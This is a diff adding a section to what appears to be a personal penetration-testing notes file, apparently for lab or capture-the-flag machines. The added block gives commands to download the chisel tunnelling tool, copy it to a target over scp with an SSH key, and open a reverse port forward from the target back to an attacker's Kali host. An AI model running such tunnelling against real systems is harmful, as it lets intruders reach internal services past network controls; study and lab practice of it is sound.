@@ -482,6 +482,25 @@ https://www.exploit-db.com/exploits/44976
 https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/
 ```
 
+### Install chisel and use to port forward
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
+gzip -d chisel_1.9.1_linux_386.gz
+
+Install on vuln machine:
+Use scp with an SSH server -
+scp -i groundfloor_user_sshkey chisel_1.9.1_linux_386 groundfloor@192.168.2.105:/home/groundfloor/
+
+start server on kali machine:
+chmod 777 first
+./chisel_1.9.1_linux_386 server --reverse --port 3333
+
+start server on target machine
+/chisel_1.9.1_linux_386 client 10.8.0.11:3333 R:80:127.0.0.1:80
+
+Connect by entering localhost into browser on kali
+```
+
 ### Wordpress non public exploit
 ```
 if able to login to the admin panel
